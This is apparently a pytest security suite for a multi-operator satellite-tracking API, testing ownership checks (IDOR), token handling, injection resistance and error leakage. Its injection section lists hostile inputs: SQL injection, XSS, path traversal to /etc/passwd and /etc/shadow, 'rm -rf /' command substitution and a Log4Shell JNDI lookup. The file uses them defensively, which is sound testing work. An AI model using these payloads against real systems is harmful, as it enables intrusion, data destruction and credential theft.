"""
Security validation: authentication and authorization, including IDOR.

Insecure Direct Object Reference is the failure mode that matters most in a
multi-operator system: operator A guesses or observes operator B's NORAD id and
reads, screens or manoeuvres their asset. Every check here is made against the
SERVER, never against what the console chooses to display — a UI that hides a
button is not an access control.

Four principals are exercised, matching the operational model:

    OPERATOR_A   owns asset A
    OPERATOR_B   owns asset B
    OPERATOR_C   owns nothing (a freshly registered account)
    ANONYMOUS    no token at all

There is deliberately no ADMIN principal, because the system has no role model:
authorization is ownership and nothing else. That is recorded as a finding in
docs/SECURITY_AUDIT.md rather than papered over with a test that pretends
otherwise.
"""
import os
import tempfile

import pytest

os.environ.setdefault("ISDMAAS_ENV", "development")
os.environ.setdefault("ISDMAAS_DATA_DIR", tempfile.mkdtemp(prefix="isdmaas-sec-"))

from fastapi.testclient import TestClient  # noqa: E402

import phase11_api  # noqa: E402

STRONG = "Tr0ubadour-Sat!"
ASSET_A = "90001"          # seeded, owned by operator_a
ASSET_B = "90002"          # seeded, owned by operator_b


@pytest.fixture(scope="module")
def client():
    with TestClient(phase11_api.app) as test_client:
        yield test_client


def _token(client, username, password):
    response = client.post(
        "/auth/login", json={"username": username, "password": password}
    )
    assert response.status_code == 200, response.text
    return {"Authorization": f"Bearer {response.json()['token']}"}


@pytest.fixture(scope="module")
def operator_a(client):
    return _token(client, "operator_a", "alpha123")


@pytest.fixture(scope="module")
def operator_b(client):
    return _token(client, "operator_b", "bravo123")


@pytest.fixture(scope="module")
def operator_c(client):
    """An account that owns nothing — the cleanest IDOR probe."""
    client.post("/auth/register", json={"username": "operator_c", "password": STRONG})
    return _token(client, "operator_c", STRONG)


# ==================================================================== IDOR
@pytest.mark.parametrize("actor", ["operator_b", "operator_c"])
def test_cannot_screen_another_operators_asset(client, request, actor):
    """Reading someone else's conjunction picture is an information leak."""
    headers = request.getfixturevalue(actor)
    response = client.get(f"/user/screen/{ASSET_A}", headers=headers)
    assert response.status_code == 403, (
        f"{actor} screened asset {ASSET_A}, which it does not own "
        f"(status {response.status_code})"
    )


@pytest.mark.parametrize("actor", ["operator_b", "operator_c"])
def test_cannot_plan_a_maneuver_on_another_operators_asset(client, request, actor):
    """
    The highest-consequence authorization boundary in the system: commanding a
    burn on someone else's spacecraft.
    """
    headers = request.getfixturevalue(actor)
    response = client.post(
        "/user/plan",
        json={"primary_norad": ASSET_A, "secondary_norad": ASSET_B},
        headers=headers,
    )
    assert response.status_code == 403, (
        f"{actor} planned a maneuver on asset {ASSET_A} (status "
        f"{response.status_code})"
    )


@pytest.mark.parametrize("actor", ["operator_b", "operator_c"])
def test_cannot_read_another_operators_screening_history(client, request, actor):
    headers = request.getfixturevalue(actor)
    response = client.get(f"/user/screen-history/{ASSET_A}", headers=headers)
    assert response.status_code == 403


def test_cannot_deregister_another_operators_asset(client, operator_b):
    """A destructive cross-tenant operation."""
    response = client.delete(f"/my/satellites/{ASSET_A}", headers=operator_b)
    assert response.status_code in (403, 404)
    # And the asset must still exist for its real owner.
    owner_view = client.get("/my/satellites", headers=operator_b).json()
    assert ASSET_A not in [s["norad"] for s in owner_view["mine"]]


def test_cannot_hijack_an_asset_by_re_registering_it(client, operator_b):
    """
    Registering an element set whose catalog number is already owned must not
    transfer ownership. This is IDOR by write rather than by read.
    """
    line1, line2 = _demo_lines(ASSET_A)
    response = client.post(
        "/my/satellites",
        json={"name": "HIJACKED", "tle1": line1, "tle2": line2},
        headers=operator_b,
    )
    assert response.status_code == 409, (
        f"operator_b re-registered asset {ASSET_A} (status {response.status_code})"
    )


def _demo_lines(norad):
    from auth_store import _demo_tles

    _, line1, line2 = _demo_tles()[norad]
    return line1, line2


def test_my_satellites_lists_only_the_callers_assets_as_owned(client, operator_a,
                                                              operator_b):
    a_view = client.get("/my/satellites", headers=operator_a).json()
    b_view = client.get("/my/satellites", headers=operator_b).json()
    assert [s["norad"] for s in a_view["mine"]] == [ASSET_A]
    assert [s["norad"] for s in b_view["mine"]] == [ASSET_B]


def test_other_operators_identities_are_not_disclosed(client, operator_a):
    """
    Which operator flies which asset is commercially sensitive. The listing must
    show that an asset is taken without naming who holds it.
    """
    body = client.get("/my/satellites", headers=operator_a).json()
    assert body["others"], "expected at least one other operator's asset"
    for entry in body["others"]:
        assert entry["owner"] == "another operator"
    assert "operator_b" not in client.get(
        "/my/satellites", headers=operator_a
    ).text


def test_authorization_failure_does_not_name_the_owner(client, operator_b):
    """A 403 must not become an enumeration oracle."""
    response = client.post(
        "/user/plan",
        json={"primary_norad": ASSET_A, "secondary_norad": ASSET_B},
        headers=operator_b,
    )
    assert response.status_code == 403
    assert "operator_a" not in response.text


# ========================================================= AUTHENTICATION
@pytest.mark.parametrize(
    "path,method",
    [
        ("/auth/me", "GET"),
        ("/my/satellites", "GET"),
        (f"/user/screen/{ASSET_A}", "GET"),
        (f"/user/screen-history/{ASSET_A}", "GET"),
        ("/auth/logout-all", "POST"),
    ],
)
def test_protected_endpoints_reject_anonymous_access(client, path, method):
    response = client.request(method, path)
    assert response.status_code == 401, f"{method} {path} allowed anonymous access"


@pytest.mark.parametrize(
    "header",
    [
        {"Authorization": "Bearer not-a-real-token"},
        {"Authorization": "Bearer "},
        {"Authorization": "Basic YWRtaW46YWRtaW4="},
        {"Authorization": "operator_a"},
        {"Authorization": "Bearer " + "A" * 500},
    ],
)
def test_malformed_or_forged_tokens_are_rejected(client, header):
    assert client.get("/auth/me", headers=header).status_code == 401


def test_a_revoked_token_stops_working_immediately(client):
    session = client.post(
        "/auth/login", json={"username": "operator_b", "password": "bravo123"}
    ).json()
    headers = {"Authorization": f"Bearer {session['token']}"}
    assert client.get("/auth/me", headers=headers).status_code == 200
    client.post("/auth/logout", headers=headers)
    assert client.get("/auth/me", headers=headers).status_code == 401
    # And it must not work for an owned resource either.
    assert client.get(f"/user/screen/{ASSET_B}", headers=headers).status_code == 401


def test_logout_all_revokes_every_session(client):
    first = client.post(
        "/auth/login", json={"username": "operator_c", "password": STRONG}
    ).json()
    second = client.post(
        "/auth/login", json={"username": "operator_c", "password": STRONG}
    ).json()
    headers_first = {"Authorization": f"Bearer {first['token']}"}
    headers_second = {"Authorization": f"Bearer {second['token']}"}
    client.post("/auth/logout-all", headers=headers_first)
    assert client.get("/auth/me", headers=headers_first).status_code == 401
    assert client.get("/auth/me", headers=headers_second).status_code == 401


def test_one_operators_token_never_authenticates_as_another(client, operator_a,
                                                            operator_b):
    assert client.get("/auth/me", headers=operator_a).json()["username"] == "operator_a"
    assert client.get("/auth/me", headers=operator_b).json()["username"] == "operator_b"


def test_session_response_never_echoes_the_password(client):
    response = client.post(
        "/auth/login", json={"username": "operator_a", "password": "alpha123"}
    )
    assert "alpha123" not in response.text


def test_login_does_not_reveal_whether_an_account_exists(client):
    known = client.post(
        "/auth/login", json={"username": "operator_a", "password": "wrong-password"}
    )
    unknown = client.post(
        "/auth/login", json={"username": "no_such_operator", "password": "wrong-password"}
    )
    assert known.status_code == unknown.status_code == 401
    assert known.json()["detail"] == unknown.json()["detail"]


# =============================================================== INJECTION
MALICIOUS_STRINGS = [
    "<script>alert(1)</script>",
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "$(rm -rf /)",
    "`id`",
    "; cat /etc/shadow",
    "\x00truncated",
    "{{7*7}}",
    "${jndi:ldap://evil/x}",
    "\ufeff\u202eevil",
]


@pytest.mark.parametrize("payload", MALICIOUS_STRINGS)
def test_malicious_satellite_names_are_stored_inertly_or_rejected(
    client, operator_a, payload
):
    """
    A hostile name must never reach a code path that interprets it. It is
    acceptable to reject it or to store it verbatim as data; what is not
    acceptable is a 500, or a response that shows it was executed or expanded.
    """
    line1, line2 = _demo_lines(ASSET_A)
    response = client.post(
        "/my/satellites",
        json={"name": payload, "tle1": line1, "tle2": line2},
        headers=operator_a,
    )
    assert response.status_code < 500, (
        f"payload {payload!r} caused a server error: {response.text[:200]}"
    )
    if response.status_code == 201:
        # Stored as data: it must come back byte-identical, not evaluated.
        assert response.json()["name"] == payload
        assert "49" not in response.json()["name"] or "{{7*7}}" == payload


@pytest.mark.parametrize("payload", MALICIOUS_STRINGS)
def test_malicious_usernames_are_rejected_by_the_validator(payload):
    """
    Checked against the validator directly rather than through the API.

    Going through /auth/register exhausts the registration rate limiter after
    five attempts and the remaining payloads come back 429, which is a correct
    rejection but tells you nothing about whether the INPUT was validated. This
    tests the property that actually matters, once per payload.
    """
    from isdmaas_core.security import normalize_username

    with pytest.raises(ValueError):
        normalize_username(payload)


def test_username_validation_is_an_allowlist_not_a_denylist(client):
    """
    The allowlist is the reason the payload list above is exhaustive enough:
    anything outside [a-z0-9._-] is refused, so no denylist has to keep pace
    with new injection syntax.
    """
    from isdmaas_core.security import normalize_username

    assert normalize_username("Operator_A-1.ops") == "operator_a-1.ops"
    # Built from code points rather than written as literals: a source file
    # containing a raw NUL is not parseable, which is itself a reminder of why
    # control characters have no business in an identifier.
    dangerous = list("<>'\";&|`$(){}[]/") + [chr(92), chr(32), chr(9), chr(10), chr(0)]
    for character in dangerous:
        with pytest.raises(ValueError):
            normalize_username(f"op{character}erator")


def test_registration_rejects_a_hostile_username_over_the_api(client):
    """One API-level confirmation, kept small so the limiter is not the answer."""
    response = client.post(
        "/auth/register",
        json={"username": "<script>alert(1)</script>", "password": STRONG},
    )
    assert response.status_code in (422, 429)
    if response.status_code == 422:
        assert "may contain only" in response.json()["detail"]


# A NUL byte cannot be expressed in a URL path at all - httpx refuses to build
# the request, and so does every conforming HTTP client and proxy in front of
# this service. It is excluded here because the test would be measuring the
# client library, not the server.
URL_SAFE_MALICIOUS = [p for p in MALICIOUS_STRINGS
                      if all(ch.isprintable() or not ch.isascii() for ch in p)]


@pytest.mark.parametrize("payload", URL_SAFE_MALICIOUS)
def test_malicious_path_parameters_do_not_traverse_or_error(client, operator_a,
                                                            payload):
    response = client.get(f"/user/screen/{payload}", headers=operator_a)
    assert response.status_code < 500, f"{payload!r} caused {response.status_code}"
    assert response.status_code in (403, 404, 422)


@pytest.mark.parametrize("payload", MALICIOUS_STRINGS)
def test_malicious_resolve_queries_are_handled(client, payload):
    response = client.get("/resolve", params={"q": payload})
    assert response.status_code < 500
    assert response.status_code in (404, 422, 503)


def test_malformed_json_is_rejected_cleanly(client):
    response = client.post(
        "/auth/login",
        content=b'{"username": "a", "password":',
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code in (400, 422)
    assert response.status_code < 500


def test_oversized_request_is_refused(client):
    """The body-size cap must fire before the payload is parsed."""
    response = client.post(
        "/cdm/assess",
        json={"cdm_text": "A" * (3 * 1024 * 1024)},
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code in (413, 422), response.status_code


def test_malicious_tle_content_is_rejected_by_validation(client, operator_a):
    """Element-set fields are parsed as numbers; hostile content must not pass."""
    response = client.post(
        "/my/satellites",
        json={
            "name": "EVIL",
            "tle1": "1 <script>alert(1)</script> 24001.50000000 .00016717 0 0 9993",
            "tle2": "2 25544 51.6416 247.4627 0006703 130.5360 325.0288 15.498 25012",
        },
        headers=operator_a,
    )
    assert response.status_code == 422
    assert response.status_code < 500


# ================================================= INFORMATION DISCLOSURE
def test_errors_never_leak_internals(client):
    """No stack traces, file paths, SQL or module names in any error response."""
    probes = [
        ("GET", "/orbit/999999999", None),
        ("GET", "/user/screen/nonexistent", None),
        ("POST", "/assess", {"primary_norad": "not-a-number"}),
        ("POST", "/maneuver-plan", {"primary_norad": 39634}),
        ("GET", "/library/does-not-exist", None),
    ]
    forbidden = [
        "Traceback", "File \"", "site-packages", "sqlite3", "SELECT ",
        "phase11_api.py", "isdmaas_core", "C:\\\\", "/home/", "psycopg",
    ]
    for method, path, body in probes:
        response = client.request(method, path, json=body)
        text = response.text
        for marker in forbidden:
            assert marker not in text, (
                f"{method} {path} leaked {marker!r}: {text[:300]}"
            )


def test_security_headers_are_present_on_errors_too(client):
    response = client.get("/orbit/999999999")
    assert response.headers["X-Content-Type-Options"] == "nosniff"
    assert response.headers["X-Frame-Options"] == "DENY"


def test_every_response_carries_a_request_id(client):
    for path in ("/health", "/orbit/999999999"):
        assert client.get(path).headers.get("X-Request-ID")


def test_demo_credentials_are_not_served_in_production_mode(client):
    """
    In development this endpoint publishes the seeded demo passwords, which is
    intended. The production guard is verified in test_production_config.py;
    here we only assert the endpoint is explicit about what it is.
    """
    response = client.get("/auth/demo-info")
    if response.status_code == 200:
        assert response.json()["development_only"] is True
        assert "warning" in response.json()
    else:
        assert response.status_code == 404
